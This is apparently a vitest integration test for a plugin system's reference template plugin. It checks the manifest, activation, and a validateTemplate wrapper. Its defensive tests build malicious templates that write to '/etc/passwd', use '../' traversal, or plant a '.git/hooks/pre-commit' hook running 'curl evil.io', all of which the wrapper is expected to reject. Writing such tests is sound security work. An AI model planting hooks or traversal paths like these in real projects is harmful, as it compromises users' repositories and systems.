/**
 * M60 — Reference template plugin (examples/plugins/org-scaffold) integration test.
 *
 * Hermetic: uses h1-fixture for HOME isolation. Does NOT use loadEnabledPlugins
 * (avoids the full gate chain — integrity pin, kill switch, etc.); instead
 * imports the plugin entry's activate() directly with a constructed PluginHost
 * stub. Mirrors the pattern established in test/m58.reference-plugin.test.ts
 * (which covers the scanner capability).
 *
 * Coverage:
 *  1. readManifest returns ok:true for the reference plugin.
 *  2. Manifest field invariants: name === basename, apiVersion compatible,
 *     capabilities includes 'template', entry contained.
 *  3. activate() with a stub host returns exactly one template, with a
 *     non-empty id, and the template's files() yields at least one TemplateFile.
 *  4. validateTemplate (REAL wrapper from wrappers.ts) prefixes the template id
 *     with the plugin name and the wrapped files() preserves the clean files.
 *  5. Path-traversal and .git/ injection: a synthetic malicious template whose
 *     files() returns bad paths is REJECTED (validateTemplate returns null).
 */

import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { basename, resolve as resolvePath, sep } from 'node:path';
import { fileURLToPath } from 'node:url';

import { makeFixture, type H1Fixture } from './helpers/h1-fixture.js';
import { readManifest } from '../src/core/plugins/manifest.js';
import { validateTemplate } from '../src/core/plugins/wrappers.js';
import { PLUGIN_API_VERSION } from '../src/core/plugins/types.js';
import type { PluginHost } from '../src/core/plugins/types.js';
import type { ProjectTemplate } from '../src/core/types.js';

// ---------------------------------------------------------------------------
// Path to the reference plugin
// ---------------------------------------------------------------------------

/** Absolute path to the org-scaffold reference plugin directory. */
// fileURLToPath (not URL.pathname) — on Windows .pathname yields "/C:/…" which
// is not a valid filesystem path; fileURLToPath produces a native path.
const PLUGIN_DIR = resolvePath(
  fileURLToPath(new URL('.', import.meta.url)),
  '../examples/plugins/org-scaffold',
);

const PLUGIN_NAME = 'org-scaffold';

// ---------------------------------------------------------------------------
// Fixture lifecycle
// ---------------------------------------------------------------------------

let fx: H1Fixture;

beforeEach(() => {
  expect.hasAssertions();
  fx = makeFixture();
});

afterEach(() => {
  fx.cleanup();
});

// ---------------------------------------------------------------------------
// Minimal PluginHost stub
// ---------------------------------------------------------------------------

function makeStubHost(overrides?: Partial<PluginHost>): PluginHost {
  return {
    apiVersion: PLUGIN_API_VERSION,
    pluginName: PLUGIN_NAME,
    log: (_msg: string) => { /* silent in tests */ },
    audit: (_action: string, _summary: string) => { /* silent in tests */ },
    settings: {},
    view: { editor: 'vscode', staleDays: 30 },
    dataDir: fx.ashlrDir,
    ...overrides,
  };
}

// ---------------------------------------------------------------------------
// 1. readManifest returns ok:true
// ---------------------------------------------------------------------------

describe('manifest validation', () => {
  it('readManifest returns ok:true for the reference plugin', () => {
    const result = readManifest(PLUGIN_DIR);
    expect(result.ok).toBe(true);
  });

  it('manifest.name equals directory basename', () => {
    const result = readManifest(PLUGIN_DIR);
    expect(result.ok).toBe(true);
    if (!result.ok) return;
    expect(result.manifest.name).toBe(basename(resolvePath(PLUGIN_DIR)));
  });

  it('manifest.name matches ^[a-z][a-z0-9-]{0,39}$', () => {
    const result = readManifest(PLUGIN_DIR);
    expect(result.ok).toBe(true);
    if (!result.ok) return;
    expect(result.manifest.name).toMatch(/^[a-z][a-z0-9-]{0,39}$/);
  });

  it('manifest.apiVersion is compatible with PLUGIN_API_VERSION', () => {
    const result = readManifest(PLUGIN_DIR);
    expect(result.ok).toBe(true);
    if (!result.ok) return;
    expect(result.manifest.apiVersion).toBeTruthy();
    // Major version in the declared range must match the host major.
    const rangeBase = result.manifest.apiVersion.replace(/^[\^~]/, '');
    const [rangeMajor] = rangeBase.split('.');
    const [hostMajor] = PLUGIN_API_VERSION.split('.');
    expect(rangeMajor).toBe(hostMajor);
  });

  it('manifest.capabilities includes "template"', () => {
    const result = readManifest(PLUGIN_DIR);
    expect(result.ok).toBe(true);
    if (!result.ok) return;
    expect(result.manifest.capabilities).toContain('template');
  });

  it('manifest.entry resolves inside the plugin directory', () => {
    const result = readManifest(PLUGIN_DIR);
    expect(result.ok).toBe(true);
    if (!result.ok) return;
    const resolvedDir = resolvePath(PLUGIN_DIR) + sep;
    const resolvedEntry = resolvePath(PLUGIN_DIR, result.manifest.entry);
    expect(resolvedEntry.startsWith(resolvedDir)).toBe(true);
  });

  it('manifest.entry is a relative path (not absolute)', () => {
    const result = readManifest(PLUGIN_DIR);
    expect(result.ok).toBe(true);
    if (!result.ok) return;
    expect(result.manifest.entry.startsWith('/')).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// 3. activate() with stub host contributes exactly one template
// ---------------------------------------------------------------------------

describe('plugin activate()', () => {
  it('returns exactly one template contribution', async () => {
    // Vitest transpiles .ts in-process; import the source via the .js specifier
    // (same pattern as m58 uses for the scanner plugin).
    const mod = await import('../examples/plugins/org-scaffold/index.js');
    const plugin = (mod.default ?? mod) as { activate: (h: PluginHost) => unknown };

    expect(typeof plugin.activate).toBe('function');

    const contributions = await Promise.resolve(plugin.activate(makeStubHost()));

    expect(contributions).toBeDefined();
    const c = contributions as { templates?: unknown[] };
    expect(Array.isArray(c.templates)).toBe(true);
    expect(c.templates).toHaveLength(1);
  });

  it('the contributed template has a non-empty id', async () => {
    const mod = await import('../examples/plugins/org-scaffold/index.js');
    const plugin = (mod.default ?? mod) as { activate: (h: PluginHost) => unknown };
    const contributions = await Promise.resolve(plugin.activate(makeStubHost()));
    const c = contributions as { templates?: Array<{ id: string }> };
    expect(c.templates?.[0]?.id).toBeTruthy();
  });

  it('the contributed template emits at least one file', async () => {
    const mod = await import('../examples/plugins/org-scaffold/index.js');
    const plugin = (mod.default ?? mod) as { activate: (h: PluginHost) => unknown };
    const contributions = await Promise.resolve(plugin.activate(makeStubHost()));
    const c = contributions as { templates?: Array<ProjectTemplate> };
    const template = c.templates?.[0];
    expect(template).toBeDefined();
    if (!template) return;

    const files = template.files({ name: 'my-service', category: 'dev-tools' });
    expect(Array.isArray(files)).toBe(true);
    expect(files.length).toBeGreaterThanOrEqual(1);
  });

  it('activate() never throws even with a minimal stub host', async () => {
    const mod = await import('../examples/plugins/org-scaffold/index.js');
    const plugin = (mod.default ?? mod) as { activate: (h: PluginHost) => unknown };
    await expect(Promise.resolve(plugin.activate(makeStubHost()))).resolves.toBeDefined();
  });
});

// ---------------------------------------------------------------------------
// 4. validateTemplate integration (REAL wrapper)
// ---------------------------------------------------------------------------

describe('validateTemplate integration (REAL wrapper)', () => {
  it('returns a non-null result for the clean contributed template', async () => {
    const mod = await import('../examples/plugins/org-scaffold/index.js');
    const plugin = (mod.default ?? mod) as { activate: (h: PluginHost) => unknown };
    const contributions = await Promise.resolve(plugin.activate(makeStubHost()));
    const c = contributions as { templates?: Array<ProjectTemplate> };
    const raw = (c.templates ?? [])[0] as ProjectTemplate;

    const validated = validateTemplate(PLUGIN_NAME, raw);
    expect(validated).not.toBeNull();
  });

  it('validated template id is prefixed with plugin name', async () => {
    const mod = await import('../examples/plugins/org-scaffold/index.js');
    const plugin = (mod.default ?? mod) as { activate: (h: PluginHost) => unknown };
    const contributions = await Promise.resolve(plugin.activate(makeStubHost()));
    const c = contributions as { templates?: Array<ProjectTemplate> };
    const raw = (c.templates ?? [])[0] as ProjectTemplate;

    const validated = validateTemplate(PLUGIN_NAME, raw)!;
    expect(validated).not.toBeNull();
    expect(validated.id).toMatch(new RegExp(`^${PLUGIN_NAME}:`));
  });

  it('validated template files() still returns at least one file', async () => {
    const mod = await import('../examples/plugins/org-scaffold/index.js');
    const plugin = (mod.default ?? mod) as { activate: (h: PluginHost) => unknown };
    const contributions = await Promise.resolve(plugin.activate(makeStubHost()));
    const c = contributions as { templates?: Array<ProjectTemplate> };
    const raw = (c.templates ?? [])[0] as ProjectTemplate;

    const validated = validateTemplate(PLUGIN_NAME, raw)!;
    expect(validated).not.toBeNull();

    const files = validated.files({ name: 'my-service', category: 'dev-tools' });
    expect(files.length).toBeGreaterThanOrEqual(1);
  });

  it('all emitted file paths are relative (no leading /)', async () => {
    const mod = await import('../examples/plugins/org-scaffold/index.js');
    const plugin = (mod.default ?? mod) as { activate: (h: PluginHost) => unknown };
    const contributions = await Promise.resolve(plugin.activate(makeStubHost()));
    const c = contributions as { templates?: Array<ProjectTemplate> };
    const raw = (c.templates ?? [])[0] as ProjectTemplate;

    const validated = validateTemplate(PLUGIN_NAME, raw)!;
    expect(validated).not.toBeNull();

    const files = validated.files({ name: 'my-service', category: 'dev-tools' });
    for (const f of files) {
      expect(f.path.startsWith('/')).toBe(false);
    }
  });

  it('all emitted file paths contain no ".." segments', async () => {
    const mod = await import('../examples/plugins/org-scaffold/index.js');
    const plugin = (mod.default ?? mod) as { activate: (h: PluginHost) => unknown };
    const contributions = await Promise.resolve(plugin.activate(makeStubHost()));
    const c = contributions as { templates?: Array<ProjectTemplate> };
    const raw = (c.templates ?? [])[0] as ProjectTemplate;

    const validated = validateTemplate(PLUGIN_NAME, raw)!;
    expect(validated).not.toBeNull();

    const files = validated.files({ name: 'my-service', category: 'dev-tools' });
    for (const f of files) {
      expect(f.path.includes('..')).toBe(false);
    }
  });

  // -------------------------------------------------------------------------
  // 5. Path-traversal and .git/ injection — wrapper REJECTS malicious templates
  // -------------------------------------------------------------------------

  it('rejects a template whose files() returns an absolute path', () => {
    const malicious: ProjectTemplate = {
      id: 'evil-absolute',
      title: 'Evil',
      description: 'Injects an absolute path',
      files: () => [{ path: '/etc/passwd', content: 'pwned' }],
    };

    const result = validateTemplate(PLUGIN_NAME, malicious);
    // validateTemplate must return null — the template is rejected.
    expect(result).toBeNull();
  });

  it('rejects a template whose files() returns a path with ".." traversal', () => {
    const malicious: ProjectTemplate = {
      id: 'evil-traversal',
      title: 'Evil',
      description: 'Injects a traversal path',
      files: () => [{ path: '../escape/config.json', content: 'pwned' }],
    };

    const result = validateTemplate(PLUGIN_NAME, malicious);
    expect(result).toBeNull();
  });

  it('rejects a template whose files() returns a path starting with ".git/"', () => {
    const malicious: ProjectTemplate = {
      id: 'evil-git',
      title: 'Evil',
      description: 'Injects a .git/ path',
      files: () => [{ path: '.git/hooks/pre-commit', content: '#!/bin/sh\ncurl evil.io' }],
    };

    const result = validateTemplate(PLUGIN_NAME, malicious);
    expect(result).toBeNull();
  });

  it('the wrapped files() silently drops any bad path injected after probe', async () => {
    // Simulate a template that passes the static probe (returns clean paths)
    // but then dynamically emits a bad path on the real call.
    // This verifies the per-call guard inside the wrapped files() function.
    let callCount = 0;
    const sneaky: ProjectTemplate = {
      id: 'sneaky-runtime',
      title: 'Sneaky',
      description: 'Clean on probe, bad on runtime',
      files: () => {
        callCount++;
        if (callCount === 1) {
          // First call = probe in validateTemplate: return clean paths.
          return [{ path: 'README.md', content: '# ok' }];
        }
        // Subsequent calls: mix a bad path in.
        return [
          { path: 'README.md', content: '# ok' },
          { path: '../escape', content: 'pwned' },
          { path: '/tmp/x', content: 'pwned' },
          { path: '.git/config', content: 'pwned' },
        ];
      },
    };

    const validated = validateTemplate(PLUGIN_NAME, sneaky);
    // Probe passed (clean first call), so validateTemplate returns non-null.
    expect(validated).not.toBeNull();
    if (!validated) return;

    // On the real call (callCount === 2), the wrapper filters out bad paths.
    const files = validated.files({ name: 'x', category: 'y' });
    // Only 'README.md' survives; the three malicious paths are dropped.
    expect(files).toHaveLength(1);
    expect(files[0]?.path).toBe('README.md');
  });
});
